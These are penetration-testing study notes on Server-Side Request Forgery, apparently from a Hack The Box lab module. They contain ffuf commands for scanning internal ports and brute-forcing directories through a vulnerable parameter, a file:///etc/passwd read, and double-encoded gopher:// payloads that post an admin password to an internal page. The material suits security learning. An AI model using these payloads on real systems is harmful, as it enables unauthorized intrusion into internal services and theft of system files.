[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.
Some commonly URL schemes vulnerable to SSRF are `http:// & https://`, `file://` and `gopher://`



# Identifying SSRF
- When we see a request making a connection to `another endpoint / URL`
![image](https://academy.hackthebox.com/storage/modules/145/ssrf/ssrf_identify_2.png)
- We can start a listener, and try to fetch our machine to see if we receive the connection
- To determine whether the HTTP response `reflects the SSRF response` to us, we can point the fetching URL to the web application itself at `http://127.0.0.1/index.php` and see if we get the HTML code
- If we get error like `"URL Blacklisted"`, we could try bypass it by trying random uppercases in the url, like `FoRgE.htb` instead of `forge.htb`



# Exploiting SSRF
- We could launch an `internal port scan` using SSRF by fuzzing all ports of the application at `http://127.0.0.1:XXXX/` using `Burp` or `FFUF`. Using `Burp Intruder`, click multiple times on `lenght` when filtering responses to be sure to don't miss ones !
```bash
# Enumerating target's local services
ffuf -w ports.txt -u http://10.129.201.127/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ&date=2024-01-01" -fr "Failed to connect to"
```
## Restricted Endpoints
- We could run a `directory brute-force` attack. We first need to determine `the web server's default error response` when we access a `non-existing page`, to `filter` our responses based on the string in the `default error pages`. Here the string `"Server at dateserver.htb Port 80"` is contained in every default Apache error pages
```bash
# Enumerating target's local services
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"
```
We could discover another URL like `http://dateserver.htb/admin.php` for example
## LFI
We could try to read arbitrary files on the system using the `file:///etc/passwd` scheme. For more info, check the [[File Inclusion]] module
- If available, we could also try to join other protocol (like maybe ftp or gopher). 
## Gopher Protocol
The `gopher` protocol allow us to communicate w/ other services like
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache
- HTTP POST request
When using SSRF, we're limited to `GET` requests as there is no way to send a `POST` request w/ the `http://` URL scheme. 
The [gopher](https://datatracker.ietf.org/doc/html/rfc1436) URL scheme allow us to create & send a `POST` request by building the `HTTP request` ourselves. 
- We can first craft our `own HTTP Post request` w/ the parameter(s) we want
```bash
# Craft our own HTTP Post request w/ parameter(s) we want to test
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```
- Next, we'll need to `URL encode` the request before sending it w/ `gopher://servername:port/_`.  
```bash
# Example using gopher protocol
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```
- If we use the `gopher` protocol inside a `POST` request, we'll need to `URL encode AGAIN` to avoid a `Malformed URL` error.
```bash
# Exploiting SSRF sending full POST request w/ gopher & double URL encoding the gopher payload
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```
- The tool [Gopherus](https://github.com/tarunkant/Gopherus) can help us to `generate gopher URLs` for us.
```bash
# Running Gopherus w/ SMTP
python2.7 gopherus.py --exploit smtp
```
## Blind SSRF
Occurs when we cannot see the response. We can set up a `netcat listner` and use the SSRF to connect to our machine to confirm it.
- We could still perform a (limited) `local port scan` by analyzing the differences between error messages ; we can check the `HTTP response` for a valid open port, and compare it to a close port. The services `must respond w/ valid HTTP responses`, otherwise we couldn't identify valid running ports (like open MySQL service)
- We can identify existing files on the system using the same technique. That is because the error message is different for existing and non-existing files, just like it differs for open and closed ports